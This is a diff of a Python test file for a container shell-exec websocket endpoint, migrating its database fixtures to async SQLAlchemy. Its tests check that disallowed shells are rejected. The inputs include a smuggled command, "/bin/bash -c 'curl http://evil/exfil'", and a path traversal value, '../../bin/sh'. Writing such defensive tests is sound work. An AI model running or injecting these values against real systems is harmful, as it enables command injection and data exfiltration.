@@ -6,27 +6,30 @@ ran inside the container. Whitelist a small set of real shell binaries.
 """
 import jwt as _jwt
 import pytest
+import pytest_asyncio
 from unittest.mock import AsyncMock, MagicMock, patch
-from sqlalchemy import create_engine
-from sqlalchemy.orm import sessionmaker
+from sqlalchemy.ext.asyncio import create_async_engine, async_sessionmaker, AsyncSession
+from sqlalchemy.pool import StaticPool
 
 from api.db.database import Base
 from api.db.models.users import User
 from api.routers.containers import container_exec, ALLOWED_EXEC_SHELLS
 
 
-engine = create_engine("sqlite:///:memory:")
-SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
+engine = create_async_engine("sqlite+aiosqlite:///:memory:", poolclass=StaticPool)
+SessionLocal = async_sessionmaker(bind=engine, class_=AsyncSession, expire_on_commit=False)
 
 SECRET = "test-secret-key-for-ws-shell"
 
 
-@pytest.fixture
-def db():
-    Base.metadata.drop_all(bind=engine)
-    Base.metadata.create_all(bind=engine)
+@pytest_asyncio.fixture
+async def db():
+    async with engine.begin() as conn:
+        await conn.run_sync(Base.metadata.drop_all)
+        await conn.run_sync(Base.metadata.create_all)
     with patch("api.routers.containers.SessionLocal", SessionLocal):
-        yield SessionLocal()
+        async with SessionLocal() as session:
+            yield session
 
 
 @pytest.fixture(autouse=True)
@@ -35,14 +38,14 @@ def enable_auth(monkeypatch):
     monkeypatch.setattr("api.routers.containers.get_secret_key", lambda: SECRET)
 
 
-def _add_user(db, username, **kw):
+async def _add_user(db, username, **kw):
     defaults = dict(
         hashed_password="pw", is_active=True, is_superuser=False, perm_start=True,
     )
     defaults.update(kw)
     u = User(username=username, **defaults)
     db.add(u)
-    db.commit()
+    await db.commit()
     return u
 
 
@@ -72,7 +75,7 @@ async def test_disallowed_shell_rejected_before_auth(db):
 
 @pytest.mark.asyncio
 async def test_command_smuggling_attempt_rejected(db):
-    _add_user(db, "ops")
+    await _add_user(db, "ops")
     ws = _make_ws(token=_token({"sub": "ops"}))
     await container_exec(
         ws, "any", shell="/bin/bash -c 'curl http://evil/exfil'", cols=80, rows=24,
@@ -82,7 +85,7 @@ async def test_command_smuggling_attempt_rejected(db):
 
 @pytest.mark.asyncio
 async def test_path_traversal_in_shell_rejected(db):
-    _add_user(db, "ops")
+    await _add_user(db, "ops")
     ws = _make_ws(token=_token({"sub": "ops"}))
     await container_exec(ws, "any", shell="../../bin/sh", cols=80, rows=24)
     ws.send_json.assert_awaited_with({"error": "Forbidden: shell not allowed"})
@@ -90,7 +93,7 @@ async def test_path_traversal_in_shell_rejected(db):
 
 @pytest.mark.asyncio
 async def test_default_sh_accepted(db, monkeypatch):
-    _add_user(db, "ops", perm_start=True)
+    await _add_user(db, "ops", perm_start=True)
     from api.routers import containers as containers_module
     object.__setattr__(
         containers_module.settings, "DOCKER_HOST", "unix:///var/run/docker.sock"
